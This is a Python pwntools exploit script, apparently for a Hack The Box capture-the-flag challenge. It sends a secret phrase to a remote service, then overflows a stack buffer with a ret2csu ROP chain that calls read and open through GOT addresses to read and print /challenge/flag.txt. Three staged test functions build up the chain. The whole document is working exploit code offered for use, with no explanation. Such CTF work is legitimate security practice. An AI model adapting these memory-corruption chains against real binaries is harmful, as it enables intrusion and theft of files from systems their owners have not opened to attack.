#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

HOST = '154.57.164.77'
PORT = 32702

csu_pop = 0x401512
csu_call = 0x4014f8
pop_rdi = 0x4011f2
ret = 0x401016
got_read = 0x403250
got_open = 0x403278
bss = 0x404100  # for reading path from stdin
bss2 = 0x404200  # for flag data

def test1():
    """CSU read(0,bss,40) → puts(bss) → main"""
    r = remote(HOST, PORT)
    r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year: ')
    
    pay = b'A' * 72
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss) + p64(40) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    pay += p64(pop_rdi) + p64(bss)
    pay += p64(0x401040)  # puts
    pay += p64(0x401393)  # main
    
    r.send(pay)
    import time; time.sleep(0.3)
    r.send(b'TEST1_WORKS' + b'\x00' * 28)
    time.sleep(1)
    try:
        data = r.recv(timeout=4)
        print(f'Test1: {data[:200]}')
        if b'TEST1_WORKS' in data:
            print('  → PASS')
        else:
            print('  → FAIL (no echo)')
    except Exception as e:
        print(f'Test1: {e}')
    r.close()

def test2():
    """CSU read + CSU open + puts(bss+0x10) + main"""
    r = remote(HOST, PORT)
    r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year: ')
    
    pay = b'A' * 72
    # 1) read path into bss
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss) + p64(40) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 2) open(bss, 0, 0)
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(got_open)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 3) puts(bss) — should print the path
    pay += p64(pop_rdi) + p64(bss)
    pay += p64(0x401040)
    pay += p64(0x401393)  # main
    
    r.send(pay)
    import time; time.sleep(0.3)
    r.send(b'/challenge/flag.txt\x00')
    time.sleep(1)
    try:
        data = r.recv(timeout=4)
        print(f'Test2: {data[:200]}')
        if b'challenge' in data:
            print('  → PASS (open succeeded, path printed)')
        elif b'mask' in data:
            print('  → FAIL (only nice wish, open crashed)')
        else:
            print('  → ?')
    except Exception as e:
        print(f'Test2: {e}')
    r.close()

def test3():
    """CSU read + CSU open + CSU read(5,bss2,0x100) + puts(bss2)"""
    r = remote(HOST, PORT)
    r.sendlineafter(b'secret phrase: ', b's34s0nf1n4l3b00')
    r.recvuntil(b'wish for next year: ')
    
    pay = b'A' * 72
    # 1) read path
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(0) + p64(bss) + p64(40) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 2) open
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(got_open)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 3) read(5, bss2, 0x100)
    pay += p64(csu_pop) + p64(0) + p64(1) + p64(5) + p64(bss2) + p64(0x100) + p64(got_read)
    pay += p64(csu_call) + p64(0) + p64(0)*6
    # 4) puts(bss2)
    pay += p64(pop_rdi) + p64(bss2)
    pay += p64(0x401040)
    
    r.send(pay)
    import time; time.sleep(0.3)
    r.send(b'/challenge/flag.txt\x00')
    time.sleep(2)
    try:
        data = r.recv(timeout=5)
        print(f'Test3: {data[:300]}')
        if b'HTB' in data or b'{' in data:
            print('  → FLAG FOUND!')
        elif b'mask' in data:
            print('  → FAIL (only nice wish)')
        else:
            print(f'  → other ({len(data)} bytes)')
    except Exception as e:
        print(f'Test3: {e}')
    r.close()

if __name__ == '__main__':
    print('=== Test 1: CSU read + puts ===')
    test1()
    print('=== Test 2: CSU read + CSU open + puts ===')
    test2()
    print('=== Test 3: Full chain ===')
    test3()
